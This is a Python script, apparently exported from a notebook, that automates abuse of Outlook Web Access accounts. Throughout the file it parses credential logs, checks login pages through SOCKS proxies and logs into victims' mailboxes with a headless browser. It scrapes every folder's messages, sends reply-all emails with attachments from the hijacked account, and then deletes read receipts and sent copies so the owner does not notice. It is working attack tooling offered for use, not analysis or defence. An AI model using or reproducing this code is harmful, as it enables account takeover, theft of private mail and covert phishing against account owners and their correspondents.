#!/usr/bin/env python
# coding: utf-8

# In[1]:


from pyvirtualdisplay import Display
import urllib.request
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
from selenium.webdriver.chrome.options import Options
import re
import requests
import socks
import socket
from urllib.parse import urlparse
import asyncio
from concurrent.futures import ThreadPoolExecutor
from timeit import default_timer
import os
import nest_asyncio
from bs4 import BeautifulSoup as soup

from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate, formataddr, parseaddr
from email.header import Header
import email

# some_file.py
import sys
# insert at 1, 0 is the script path (or '' in REPL)
sys.path.insert(1, '/code/python/check_mt/')
from includes.RootLogger import rootLogger


#important shit for async funcs
nest_asyncio.apply()
display = Display(visible=0, size=(1440, 900))
display.start()

class WebMailClass():

    # list of solders
    folders = []
    # active folder
    active_folder = None
    #
    urls_ready_to_request = []
    #
    url_get_header_params = {}
    # max pages per folder to scan
    max_pages=1

    def __init__(self, socks_address, socks_port, prefix='[WebAccount]:', webmail_url=''):
        self.socks_address = socks_address
        self.socks_port = socks_port
        self.prefix = prefix

        self.driver = None
        self.webmail_url = webmail_url

        if not display.is_started:
            display.start()



    #method to parse logs data
    #firstly we check str to contain creds (OWA fields - username/password)
    #then using socks analyze login page content
    #if all okay => True
    #and we can try to log in via grabber method
    def LogsParser(self, logs_data, logs_url):

        try:
            mail_username = urllib.parse.unquote(re.search('&username=(.*?)&', logs_data+'&').group(1))
            mail_password = urllib.parse.unquote(re.search('&password=(.*?)&', logs_data+'&').group(1))
            text = requests.get(logs_url,
                    proxies=dict(http=f'socks5://{self.socks_address}:{self.socks_port}',
                                 https=f'socks5://{self.socks_address}:{self.socks_port}')).text.lower()
            #rootLogger.info(fm{self.prefix} ail_username,mail_password,text)
            if len(mail_username)>0            and len(mail_password)>0            and len(re.findall('outlook',text))>0:
                return True,mail_username,mail_password
            else:
                return False, None, None
        except Exception as e:
            rootLogger.error(f"{self.prefix} LogsParser:{e}")

    #this method returns firefox web driver for job methods (grabber,sender)

    def StartSession(self, webmail_login, webmail_password, webmail_url, grabber_mode):
        #display = Display(visible=0, size=(800, 600))
        #display.start()
        #set up firefox settings - profile and proxy
        url_parsed = webmail_url
        #urlparse(webmail_url).scheme+'://'+urlparse(webmail_url).netloc
        #options = webdriver.ChromeOptions()
        #proxy = f'{self.socks_address}:{self.socks_port}'
        #options.add_argument('--no-sandbox')
        #options.add_argument('--proxy-server=socks5://' + proxy)
        #options.add_argument("--incognito")
        #driver = webdriver.Chrome(options=options)
        profile = webdriver.FirefoxProfile()
        profile.set_preference("network.proxy.type", 1)
        profile.set_preference("network.proxy.socks", self.socks_address)
        profile.set_preference("network.proxy.socks_port", self.socks_port)
        profile.set_preference("network.proxy.socks_version", 5)
        profile.update_preferences()

        #start browsing and open url
        driver = webdriver.Firefox(firefox_profile=profile)
        timeout=30
        driver.get(url_parsed)
        time.sleep(5)
        try:
            element_present = EC.presence_of_element_located((By.NAME, 'username'))
            WebDriverWait(driver, timeout).until(element_present)
        except TimeoutException:
            rootLogger.info(f"{self.prefix} Timed out waiting for page to load")

        #time.sleep(5)
        #rootLogger.info(fd{self.prefix} river.page_source)
        #input usrnm and pswrd and login and submit em

        username = driver.find_element_by_name("username")
        password = driver.find_element_by_name("password")
        driver.get_screenshot_as_file('index.png')
        username.send_keys(webmail_login)
        password.send_keys(webmail_password)
        if len(driver.find_elements_by_id('chkBsc'))==0:
            raise Exception('Incorrent Outlook Version')
        if grabber_mode==True:
            driver.find_element_by_id('chkBsc').click()

        try:
            driver.find_element_by_class_name('btn').click()
        except:
            driver.find_element_by_class_name('signinbutton').click()

        if len(re.findall('reason=2',driver.current_url))>0:
            raise Exception('Incorrent username or password')
        rootLogger.info(f'{self.prefix} Session started')
        if grabber_mode != True and  len([x for x in driver.find_elements_by_xpath('//*[@id="lnkBrwsAllFldrs"]') if x.is_displayed()])>0:
            rootLogger.info(f'{self.prefix} This is light version, changing options and relogin has been started...')
            driver.get_screenshot_as_file('loaded.png')
            driver.get(driver.current_url+'?ae=Options&t=General')
            driver.find_element_by_id('chkOptAcc').click()
            driver.get_screenshot_as_file('options.png')
            driver.find_element_by_id('lnkHdrsave').click()
            driver.find_element_by_id('lo').click()
            driver.get(url_parsed)
            try:
                element_present = EC.presence_of_element_located((By.NAME, 'username'))
                WebDriverWait(driver, timeout).until(element_present)
            except TimeoutException:
                rootLogger.info(f"{self.prefix} Timed out waiting for page to load")

            username = driver.find_element_by_name("username")
            password = driver.find_element_by_name("password")
            username.send_keys(webmail_login)
            password.send_keys(webmail_password)
            driver.find_element_by_class_name('btn').click()

        self.driver = driver

        return driver

    def fetch(self, session, urls, headers_only=False):

        with session.get(urls['header']) as response_header:
            data_header = response_header.text
            page_soup = soup(data_header, "html.parser")
            text_header = page_soup.find("textarea").getText()

        if not headers_only:
            with session.get(urls['body']) as response_body:
                data_body = response_body.text
                page_soup = soup(data_body, "html.parser")
                body_html = page_soup.find("div", {"class": "bdy"}).prettify()
                #rootLogger.info(fd{self.prefix} ata_body)

        # self.hdrs.append({'id':urls['id']
        #                   ,'header':text_header
        #                   ,'body':body_html})

        return {'id':urls['id']
              ,'header':text_header
              ,'body':body_html}

    # smtp-related commands for compatibility with smtplib
    def login(self, webmail_login, webmail_password):

        self.StartSession(webmail_login=webmail_login, webmail_password=webmail_password, webmail_url=self.webmail_url, grabber_mode = False)
        return self

    def connect(self, host=None, port=None):
        # dummy function as has no meaning in current realization
        return self

    def starttls(self):
        return self

    def ehlo_or_helo_if_needed(self):
        return self

    def close(self):
        return self.quit()

    def get_log(self):
        return ['']


    #funcs makes async fetch func apply
    async def get_data_asynchronous(self, norm_session, urls_headers, max_workers=1, threadLock=None ):
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            with norm_session as session:
                # Set any session parameters here before calling `fetch`
                loop = asyncio.get_event_loop()

                tasks = [
                    loop.run_in_executor(
                        executor,
                        self.fetch,
                        *(session, url_header) # Allows us to pass in multiple arguments to `fetch`
                    )
                    for url_header in urls_headers
                ]
                for response in await asyncio.gather(*tasks):
                    pass

    def WebMailGrabber(self, driver=None):

        if driver is None:
            if self.driver is not None:
                driver = self.driver
            else:
                raise Exception('No session driver')

        # rootLogger.info(f"{self.prefix} start WebMailGrabber")
        self.hdrs=[]
        try:
            alert = driver.switch_to.alert
            alert.accept()
        except:
            pass

        try:
            driver.find_elements_by_xpath('//*[@id="lnkBrwsAllFldrs"]')[0].click()
        except:
            pass
        url_get_header_params={'?oeh':1
                   ,'ns':'ReadMessage'
                   ,'ev':'LMD'
                   }

        url_to_request_headers=driver.current_url.split(f'/owa')[0]+'/owa/ev.owa'
        cooks=driver.get_cookies()
        session_to_work = requests.Session()

        for cookie in cooks:
            session_to_work.cookies.set(cookie['name'], cookie['value'])
        for el in cooks:
            if el['name']=='UserContext':
                url_get_header_params.update({'canary':el['value']})

        # driver.save_screenshot('/code/python/check_mt/webmails/screenie.png')

        # elem = driver.find_element_by_xpath("//*")
        # source_code = elem.get_attribute("outerHTML")
        # with open('/code/python/check_mt/webmails/screenie.html', 'wb') as f:
        #     f.write(source_code.encode('utf-8'))

        folders_ids=[]
        global_letters_ids=[]
        folders_list=driver.find_elements_by_id('selbrfld')[0]

        # driver.save_screenshot('/code/python/check_mt/webmails/screenie2.png')
        # elem = driver.find_element_by_xpath("//*")
        # source_code = elem.get_attribute("outerHTML")
        # with open('/code/python/check_mt/webmails/screenie2.html', 'wb') as f:
        #     f.write(source_code.encode('utf-8'))

        for folder_element in folders_list.find_elements_by_xpath(".//*"):
            attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', folder_element)
            f_nm=attrs['title']
            f_id=attrs['value']
            folders_ids.append({f_nm:f_id})

        # rootLogger.info(f"{self.prefix} got folder ids:{folders_ids}")

        for folder_id in folders_ids:
            #rootLogger.info(fl{self.prefix} ist(folder_id.values())[0])
            driver.get((driver.current_url.split(f'/owa')[0]+f"/owa/?ae=Folder&t={list(folder_id.values())[0]}"))
            pages=1
            if len(driver.find_elements_by_xpath('/html/body/form/table/tbody/tr[3]/td[2]/table[2]/tbody/tr/td[16]/a'))>0:
                f=driver.find_elements_by_xpath('/html/body/form/table/tbody/tr[3]/td[2]/table[2]/tbody/tr/td[16]/a')
                attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', f[0])
                page=attrs['onclick']
                pages=int(re.search("('(.*?)')",page).group(1).replace("'",""))


            for page_num in range(1,pages+1):
                rootLogger.info(f'{self.prefix} Start parse {page_num} page..')
                this_pages_id=[]
                urls_ready_to_request=[]

                driver.get((driver.current_url.split(f'/owa')[0]+f"/owa/?ae=Folder&t={list(folder_id.values())[0]}")+f"&pg={page_num}")
                time.sleep(2)
                for chkbox in driver.find_elements_by_xpath("//input[@type='checkbox']")[1:]:
                    attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', chkbox)
                    id_letter=attrs['value']
                    if id_letter not in global_letters_ids:
                        global_letters_ids.append(id_letter)
                        id_transformed=re.sub('/', '%252f', id_letter)
                        id_transformed=id_transformed.replace("+","%252b")
                        url_get_header_params.update({'Id':'id%3d'+id_transformed})
                        #rootLogger.info(fu{self.prefix} rl_get_header_params)
                        st_=''
                        for key,val in url_get_header_params.items():
                            st_+=str(key)+'='+str(val)+'&'
                        get_query_url=str(url_to_request_headers+st_).strip('&')
                        id_transformed_1=re.sub('/', '%2f', id_letter)
                        id_transformed_1=id_transformed_1.replace("+","%2b")
                        get_query_url_body=driver.current_url.split(f'/owa')[0]+'/owa/'+"?ae=Item&t=IPM.Note&id="+id_transformed_1
                        urls_ready_to_request.append({'id':id_letter
                                                        ,'header':get_query_url
                                                        ,'body':get_query_url_body})

                        rootLogger.info(f'{self.prefix} get_query_url:{get_query_url}\r\n{self.prefix}get_query_url_body:{get_query_url_body}')

            #make async funcs and start it
            loop = asyncio.get_event_loop()
            future = asyncio.ensure_future(self.get_data_asynchronous(session_to_work, urls_ready_to_request))
            loop.run_until_complete(future)

            rootLogger.info(f"{self.prefix} self.hdrs[0]:{self.hdrs[0]}")

        return self.hdrs

    # for ease of use in common API
    def getFolders(self, driver=None):

        if driver is None:
            if self.driver is not None:
                driver = self.driver
            else:
                raise Exception('No session driver')

        try:
            alert = driver.switch_to.alert
            alert.accept()
        except:
            pass

        try:
            driver.find_elements_by_xpath('//*[@id="lnkBrwsAllFldrs"]')[0].click()
        except:
            pass

        self.url_get_header_params={'?oeh':1
                   ,'ns':'ReadMessage'
                   ,'ev':'LMD'
                   }

        self.url_to_request_headers=driver.current_url.split(f'/owa')[0]+'/owa/ev.owa'
        cooks=driver.get_cookies()
        self.session_to_work = requests.Session()

        for cookie in cooks:
            self.session_to_work.cookies.set(cookie['name'], cookie['value'])

        for el in cooks:
            if el['name']=='UserContext':
                self.url_get_header_params.update({'canary':el['value']})

        folders_ids=[]
        global_letters_ids=[]
        folders_list=driver.find_elements_by_id('selbrfld')[0]

        folder_names = []

        for folder_element in folders_list.find_elements_by_xpath(".//*"):
            attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', folder_element)
            f_nm=attrs['title']
            f_id=attrs['value']
            folders_ids.append({f_nm:f_id})
            folder_names.append(f_nm)

        # save all folders into proper list
        self.folders = folders_ids

        return folder_names

    def selectFolder(self, folder_name, driver=None):

        if driver is None:
            if self.driver is not None:
                driver = self.driver
            else:
                raise Exception('No session driver')


        self.active_folder = None
        for folder in self.folders:
            if folder_name in folder:
                self.active_folder = folder[folder_name]

        if self.active_folder is None:
            raise Exception(f'{self.prefix} Could not find folder:{folder_name} in list.')

        rootLogger.info(f"{self.prefix} applied folder_id:{self.active_folder}")

        driver.get((driver.current_url.split(f'/owa')[0]+f"/owa/?ae=Folder&t={self.active_folder}"))
        pages=1
        if len(driver.find_elements_by_xpath('/html/body/form/table/tbody/tr[3]/td[2]/table[2]/tbody/tr/td[16]/a'))>0:
            f=driver.find_elements_by_xpath('/html/body/form/table/tbody/tr[3]/td[2]/table[2]/tbody/tr/td[16]/a')
            attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', f[0])
            page=attrs['onclick']
            pages=int(re.search("('(.*?)')",page).group(1).replace("'",""))

        pages = min(pages, self.max_pages)


        global_letters_ids=[]
        urls_ready_to_request=[]
        for page_num in range(1,pages+1):
            rootLogger.info(f'{self.prefix} Start parse {page_num} page..')
            # this_pages_id=[]
            # urls_ready_to_request=[]

            driver.get((driver.current_url.split(f'/owa')[0]+f"/owa/?ae=Folder&t={self.active_folder}")+f"&pg={page_num}")
            time.sleep(2)
            for chkbox in driver.find_elements_by_xpath("//input[@type='checkbox']")[1:]:
                attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', chkbox)
                id_letter=attrs['value']
                if id_letter not in global_letters_ids:
                    global_letters_ids.append(id_letter)
                    id_transformed=re.sub('/', '%252f', id_letter)
                    id_transformed=id_transformed.replace("+","%252b")
                    self.url_get_header_params.update({'Id':'id%3d'+id_transformed})
                    #rootLogger.info(fu{self.prefix} rl_get_header_params)
                    st_=''
                    for key,val in self.url_get_header_params.items():
                        st_+=str(key)+'='+str(val)+'&'
                    get_query_url=str(self.url_to_request_headers+st_).strip('&')
                    id_transformed_1=re.sub('/', '%2f', id_letter)
                    id_transformed_1=id_transformed_1.replace("+","%2b")
                    get_query_url_body=driver.current_url.split(f'/owa')[0]+'/owa/'+"?ae=Item&t=IPM.Note&id="+id_transformed_1
                    urls_ready_to_request.append({'id':id_letter
                                                    ,'header':get_query_url
                                                    ,'body':get_query_url_body})

        # save in reverse order, because getMessage goes from higher to lower ids
        self.urls_ready_to_request = urls_ready_to_request[::-1]

        return len(self.urls_ready_to_request)

    def getMessage(self, msg_num, headers_only=False):
        fetch_url = self.urls_ready_to_request[msg_num-1]

        msg_data = self.fetch(self.session_to_work, fetch_url, headers_only)

        # TODO: generate MIME compatible message from it, so i can parse it a bit later as all other types:
        # msg = MIMEMultipart()
        # set to utf8 always
        # msg.set_charset("utf-8")
        msg = email.message_from_string(msg_data['header'] + "\r\n\r\n" + msg_data['body'])

        # msg.attach(MIMEText(msg_data['body'], 'html', 'utf-8'))

        return msg

    #disable conversation view - cause it obscures scrapping
    def view_conversation_disabler(self,driver):
        try:
            [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='View'][0].click()
            time.sleep(1)
            conv_opt=driver.find_elements_by_id('useConversations')[0]
            if len([x for x in conv_opt.find_elements_by_id('imgChk') if x.is_displayed()])>0:
                [x for x in conv_opt.find_elements_by_id('imgChk') if x.is_displayed()][0].click()
                time.sleep(3)
            [x for x in driver.find_elements_by_id('imgLiveLogo') if x.is_displayed()][0].click()

        except:
            pass

    def alerts_closer(self,driver):
        try:
            [x for x in driver.find_elements_by_id('imgLiveLogo') if x.is_displayed()][0].click()
        except:
            pass
        try:
            alert = driver.switch_to.alert
            alert.accept()
        except:
            pass

        try:
            dialogs=driver.find_elements_by_class_name('btnDlg')
            for dialog in dialogs:
                try:
                    dialog.find_elements_by_id('imgX')[0].click()
                except Exception as e:
                    pass
            while len([x for x in driver.find_elements_by_id('divBtnSnooze') if x.is_displayed()])>0:
                driver.find_element_by_id('divBtnSnooze').click()
        except:pass

    #send email method
    def SendEmail(self, driver=None, letter_id=None, answer_body='', report_flag=False, remove_sent_flag=True, attachment=None, subject=None, send_to=None):

        if driver is None:
            if self.driver is not None:
                driver = self.driver
            else:
                raise Exception('No session driver')

        #open new window, define windows and get preform to reply all mode
        base_url=driver.current_url
        driver.execute_script("window.open()")
        time.sleep(3)
        main_window=driver.window_handles[0]
        sending_windows=driver.window_handles[1]
        driver.switch_to.window(sending_windows)

        if letter_id:
            id_quoted=urllib.parse.quote(letter_id, safe='')
            open_url = f'{base_url}?ae=PreFormAction&a=ReplyAll&t=IPM.Note&id={id_quoted}'
        else:
            open_url = f'{base_url}?ae=Item&a=New&t=IPM.Note' #&cc=MTQuMy4zOTkuMCxlbi1VUyw0Mjk0OTY3Mjk1LEhUTUwsMCww&pspid=_1586775476163_540497666'


        driver.get(open_url)


        rootLogger.info(f'{self.prefix} {open_url}')
        #rootLogger.info(fd{self.prefix} river.page_source)
        time.sleep(2)
        try:
            alert = driver.switch_to.alert
            alert.dismiss()
            time.sleep(0.5)
        except:
            pass

        # subject
        if subject:
            to_input = driver.find_element_by_id("divTo")

            # click on TO
            to_input.click()
            for i in range(50):
                to_input.send_keys(Keys.BACKSPACE)

            to_input = driver.find_element_by_id("divTo")
            to_input.send_keys( send_to )
            time.sleep(0.65)
            # click on subject
            subject_input = driver.find_element_by_id("txtSubj")
            subject_input.click()
            subject_input.send_keys( subject )


        #switch to textarea iframe and place preprocessed answer plaintext or html
        frame = driver.find_element_by_tag_name("iframe")
        driver.switch_to.frame(frame)
        time.sleep(1)
        br=driver.find_elements_by_tag_name('br')[0]
        driver.execute_script(f"arguments[0].outerHTML= '{answer_body}';",br)
        time.sleep(1)
        rootLogger.info(f'{self.prefix} Body pasted')

        # fix subject for next operations
        driver.switch_to.default_content()
        time.sleep(1)

        subj = ''
        sub_el = driver.find_element_by_id('txtSubj')
        attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', sub_el)
        subj = attrs['value']

        subj = subj.strip()

        if len(subj) < 1:
            # rootLogger.info(f"{self.prefix} try get subj via innerHTML")
            try:
                subj = sub_el.get_attribute('innerHTML')
            except Exception as e:
                rootLogger.error(f"subj_el innerHTML:{e}")

        if len(subj) < 1:
            # rootLogger.info(f"{self.prefix} try get subj via value")
            try:
                subj = sub_el.get_attribute('value')
            except Exception as e2:
                rootLogger.error(f"subj_el value:{e2}")

        # rootLogger.info(f"{self.prefix} subj so far from all variants:{subj}")
        subj_n = ''.join([x for x in subj.lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])


        #add attachment
        if attachment != False and attachment is not None:
            #click to call attachment procedure
            driver.find_elements_by_id('divToolbarButtonattachfile')[0].click()
            #recursively switch to work frame
            frame = None
            while frame is None:
                try:
                    frame = driver.find_elements_by_id('iFrameModalDlg')[0]
                except:
                    self.alerts_closer(driver)
                    pass
            driver.switch_to.frame(frame)
            frame = None
            while frame is None:
                try:
                    frame = driver.find_elements_by_tag_name('iframe')[0]
                except:
                    self.alerts_closer(driver)
                    pass
            driver.switch_to.frame(frame)

            # try to find proper input
            max_attempts = 50
            attempts = 0
            file_input = None

            while file_input is None:
                if attempts < max_attempts:
                    attempts = attempts + 1
                else:
                    rootLogger.info(f"{self.prefix} input[type=file] locating attempts exceeded")
                    # just raise proper exception
                    file_input = driver.find_element_by_css_selector('input[type=file]')

                try:
                    file_input = driver.find_element_by_css_selector('input[type=file]')
                except:
                    self.alerts_closer(driver)
                    time.sleep(0.25)
                    pass

            #input path to file
            # [x for x in driver.find_elements_by_tag_name("input") if x.is_displayed()][0].send_keys(attachment['path'])
            # <input id="file1" name="file1" size="50" class="fileField" onclick="_e(this,this.getAttribute(&quot;_e_onclick&quot;), event)" _e_onclick="_this.select(_this);" type="file">

            # file_input = driver.find_element_by_class_name("fileField")
            file_input.send_keys(attachment['path'])

            driver.find_elements_by_id('btnAttch')[0].click()
            time.sleep(3)
            driver.switch_to.default_content()

            rootLogger.info(f'{self.prefix} File attached')

        if report_flag==True:
            time.sleep(1)
            #if you need report place the flag in the option
            options = None
            while options is None:
                try:
                    options = [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Options...' and x.is_displayed()][0]
                except:
                    self.alerts_closer(driver)
                    pass
            for i in range(50):
                try:
                    options.click()
                except:
                    pass
            rootLogger.info(f'{self.prefix} Options clicked')
            driver.get_screenshot_as_file('options.png')
            checkbox = None
            while checkbox is None:
                try:

                    checkbox = [x for x in driver.find_elements_by_id("chkDvRcp") if x.is_displayed()][0]

                except:

                    self.alerts_closer(driver)
                    pass
            time.sleep(1)

            checkbox.click()
            rootLogger.info(f'{self.prefix} checkbox clicked')
            time.sleep(1)
            checkbox = None
            while checkbox is None:
                try:
                    checkbox = [x for x in driver.find_elements_by_id('btn0') if x.is_displayed()][0]
                except:
                    self.alerts_closer(driver)
                    pass
            checkbox.click()
            rootLogger.info(f'{self.prefix} Report requested')
            time.sleep(2)

        # for i in range(50):
        #     driver.find_elements_by_id('divTo')[0].send_keys(Keys.BACKSPACE)
        # driver.find_elements_by_id('divTo')[0].send_keys("e1236758@urhen.com")

        rootLogger.info(f'{self.prefix} EMail changed')
        #find the send button and click on it
        send_button=None
        while send_button is None:
            try:
                send_button = [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Send' and x.is_displayed()][0]
            except Exception as e:
                self.alerts_closer(driver)
                pass

        for i in range(20):
            try:
                [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Send' and x.is_displayed()][0].click()
            except Exception as e:
                #rootLogger.info(fe{self.prefix} )
                pass
        rootLogger.info(f'{self.prefix} Sent')
        time.sleep(3)
        driver.switch_to.window(main_window)
        time.sleep(3)

        #driver.get_screenshot_as_file('switch.png')
        rootLogger.info(f'{self.prefix} Switched')

        ################################################
        #mark report flag if you need#
        ################################################
        if report_flag==True:
            time.sleep(10)
            reports=[]
            for i in range(10):
                self.alerts_closer(driver)
            #move to inbox
            breadcrumbs = None
            while breadcrumbs is None:
                try:

                    breadcrumbs = [x for x in driver.find_elements_by_id("divBreadcrumbs") if x.is_displayed()][0]
                except:
                    #self.alerts_closer(driver)
                    pass

            #check current folder and move to 'Inbox' folder
            current_folder=None

            while current_folder is None:
                try:
                    current_folder = [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0]
                except:
                    self.alerts_closer(driver)
                    pass

            while [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0].text!='Inbox':
                try:
                    [x for x in driver.find_elements_by_xpath("//span[@id='spnFldrNm']") if x.text=='Inbox' and x.is_displayed()][0].click()
                    time.sleep(3)
                except:
                    self.alerts_closer(driver)
                    pass
            rootLogger.info(f'{self.prefix} Moved to Inbox')
            try:
                self.view_conversation_disabler(driver)
                time.sleep(3)
            except:
                self.alerts_closer(driver)
                pass
            #wait untill letters load
            let_els = None
            while let_els is None:
                try:
                    let_els = [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]')]
                except:
                    self.alerts_closer(driver)
                    pass

            try:
                for element in [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]')]:
                    try:
                        element_text=''.join([x for x in element.text.lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])
                        #rootLogger.info(fe{self.prefix} lement_text,'------',subj_n)
                        if len(re.findall(subj_n,element_text))>0:
                            element.click()
                            self.alerts_closer(driver)
                            time.sleep(1)
                            frame = driver.find_element_by_id('ifBdy')
                            driver.switch_to.frame(frame)
                            report=driver.find_element_by_xpath('/html/body').get_attribute('outerHTML')
                            reports.append(report)
                            driver.switch_to.default_content()
                            [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Delete'][0].click()
                            rootLogger.info(f'{self.prefix} Deleted from Inbox')
                    except Exception as e:
                        self.alerts_closer(driver)
                        #rootLogger.info(fe{self.prefix} )
            except Exception as e:
                self.alerts_closer(driver)
                #rootLogger.info(fe{self.prefix} )
            #find the reports via subject, write it and delete

            #move to deleted and permanent delete reports
            #move to Deleted Items and Delet em all
            breadcrumbs = None
            while breadcrumbs is None:
                try:
                    breadcrumbs = [x for x in driver.find_elements_by_id("divBreadcrumbs") if x.is_displayed()][0]
                except:
                    self.alerts_closer(driver)
                    pass
            current_folder=None
            while current_folder is None:
                try:
                    current_folder = [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0]
                except:
                    self.alerts_closer(driver)
                    pass
            while [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0].text!='Deleted Items':
                try:
                    [x for x in driver.find_elements_by_xpath("//span[@id='spnFldrNm']") if x.text=='Deleted Items' and x.is_displayed()][0].click()
                    time.sleep(5)
                    rootLogger.info(f'{self.prefix} Moved to Deleted')
                except:
                    self.alerts_closer(driver)
                    pass
            let_els = None
            while let_els is None:
                try:
                    let_els = [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]')]
                except:
                     pass
            for element in [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]') if x.is_displayed()]:
                self.alerts_closer(driver)
                try:
                    element_text=''.join([x for x in element.text.lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])
                    attrs = driver.execute_script('var items = {}; for (index = 0; index < arguments[0].attributes.length; ++index) { items[arguments[0].attributes[index].name] = arguments[0].attributes[index].value }; return items;', element)
                    if len(re.findall(subj_n,element_text))>0:
                        element.click()
                        [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Delete'][0].click()
                        alert = driver.switch_to.alert
                        alert.accept()
                        rootLogger.info(f'{self.prefix} Deleted from deleted items')
                except:
                    self.alerts_closer(driver)
                    continue

        ################################################
        #similar way delete from sent items if you need#
        ################################################
        if remove_sent_flag == True:

            for folder in ('Sent Items', 'Deleted Items'):
                if self.navigateToFolder(folder):
                    time.sleep(1.25)
                    self.removeLetterBySubj(subj_n)

                    time.sleep(1)
                    try:
                        self.view_conversation_disabler(driver)
                        time.sleep(2.5)
                    except:
                        self.alerts_closer(driver)
                        pass
                else:
                    rootLogger.info(f'{self.prefix} move to {folder} failed')
                    raise Exception(f'Folder "{folder}" moving failed')

            # #wait for breadcrumbs element to define it
            # breadcrumbs = None
            # while breadcrumbs is None:
            #     try:

            #         breadcrumbs = [x for x in driver.find_elements_by_id("divBreadcrumbs") if x.is_displayed()][0]
            #     except:
            #         #self.alerts_closer(driver)
            #         pass

            # #check current folder and move to 'Sent Items' folder
            # current_folder=None

            # while current_folder is None:
            #     try:
            #         current_folder = [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0]
            #     except:
            #         self.alerts_closer(driver)
            #         pass

            # # while [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0].text!='Sent Items':
            # while [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0].get_attribute('innerHTML') != 'Sent Items':
            #     try:
            #         # [x for x in driver.find_elements_by_xpath("//span[@id='spnFldrNm']") if x.text=='Sent Items' and x.is_displayed()][0].click()
            #         [x for x in driver.find_elements_by_xpath("//span[@id='spnFldrNm']") if x.get_attribute('innerHTML').strip() == 'Sent Items' and x.is_displayed()][0].click()
            #         time.sleep(5)
            #         rootLogger.info(f'{self.prefix} Moved to Sent Items')
            #     except:
            #         self.alerts_closer(driver)
            #         pass

            # time.sleep(1)
            # try:
            #     self.view_conversation_disabler(driver)
            #     time.sleep(3)
            # except:
            #     self.alerts_closer(driver)
            #     pass

            # #wait untill letters load
            # # let_els = None
            # # while let_els is None:
            # #     try:
            # #         let_els = [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]')]
            # #     except:
            # #         self.alerts_closer(driver)
            # #         pass

            # max_attempts = 50
            # attempts = 0
            # div_subj = None
            # while div_subj is None:
            #     if attempts < max_attempts:
            #         attempts = attempts + 1
            #     else:
            #         div_subj = driver.find_element_by_css_selector("#divSubject")

            #     try:
            #         div_subj = driver.find_element_by_css_selector("#divSubject")
            #     except Exception as e:
            #         time.sleep(0.25)
            #         # raise e

            # try:
            #     # for element in [x for x in driver.find_elements_by_xpath('//*[@id="divSubject"]')]:
            #     for element in [x for x in driver.find_elements_by_css_selector('#divSubject')]:
            #         try:
            #             rootLogger.info(f"{self.prefix} element.text:{element.text} element.get_attribute('innerHTML'):{element.get_attribute('innerHTML')}")
            #             element_text = ''.join([x for x in element.get_attribute('innerHTML').lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])
            #             # element_text = ''.join([x for x in element.text.lower() if x in 'abcdefghijklmnopqrstuvwxyz 0123456789'])

            #             if len(re.findall(subj_n, element_text)) > 0:
            #                 rootLogger.info(f"{self.prefix} subj compare:{subj_n} vs {element_text} is matched!")

            #                 element.click()
            #                 time.sleep(1)
            #                 [x for x in driver.find_elements_by_class_name('tbLh') if x.text=='Delete'][0].click()
            #                 rootLogger.info(f'{self.prefix} Deleted from Sent Items')
            #         except Exception as e:
            #             self.alerts_closer(driver)
            #             # rootLogger.error(f"{self.prefix}:{e}" )
            # except Exception as e:
            #     self.alerts_closer(driver)
            #     # rootLogger.info(f"{self.prefix}:{e}" )

            # try:
            #     self.alerts_closer(driver)
            # except:
            #     pass

            # # move to Deleted Items and Delet em all
            # breadcrumbs = None
            # while breadcrumbs is None:
            #     try:
            #         breadcrumbs = [x for x in driver.find_elements_by_id("divBreadcrumbs") if x.is_displayed()][0]
            #     except:
            #         self.alerts_closer(driver)
            #         pass

            # current_folder = None
            # while current_folder is None:
            #     try:
            #         current_folder = [x for x in breadcrumbs.find_elements_by_id("spnFldNm") if x.is_displayed()][0]
            #     except:
            #         self.alerts_closer(driver)
            #         pass

